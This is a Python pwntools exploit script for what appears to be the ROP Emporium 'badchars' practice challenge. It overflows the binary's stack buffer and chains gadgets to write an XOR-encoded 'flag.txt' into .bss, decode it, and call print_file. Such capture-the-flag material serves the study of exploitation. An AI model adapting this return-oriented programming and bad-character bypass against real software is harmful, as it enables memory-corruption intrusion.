from pwn import *

elf = ELF('../badchars/badchars')

p = process('../badchars/badchars')
# context.terminal = ["tmux", "splitw"]
# p = gdb.debug('../badchars/badchars')
p.recvuntil(b'> ')

def write_qword(address, content):
    # pop r12; pop r13; pop r14; pop r15; ret;
    pop_r12_r13_r14_r15_ret = 0x40069c
    # mov qword ptr [r13], r12; ret;
    mov_r13_r12_ret = 0x400634
    # pop r14; pop r15; ret;
    pop_r14_r15_ret = 0x4006a0
    # xor byte ptr [r15], r14b; ret;
    xor_ret = 0x400628
    # pop r15; ret;
    pop_r15_ret = 0x4006a2

    payload  = p64(pop_r12_r13_r14_r15_ret)
    payload += content
    payload += p64(address)
    payload += p64(0xff)
    payload += p64(address)
    payload += p64(mov_r13_r12_ret)
    payload += p64(xor_ret)
    for i in range(1, 8):
        payload += p64(pop_r15_ret)
        payload += p64(address + i)
        payload += p64(xor_ret)

    return payload


print_file = elf.symbols['print_file']
location   = elf.bss()

rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]


filename = b'flag.txt'
filename_xored = b''
for x in filename:
    filename_xored += (x ^ 0xff).to_bytes(length=1, byteorder='little')


junk = b'A' * 0x20 + b'A' * 0x8
payload  = junk
payload += write_qword(location, filename_xored)
payload += p64(pop_rdi_ret)
payload += p64(location)
payload += p64(print_file)


p.sendline(payload)
p.interactive()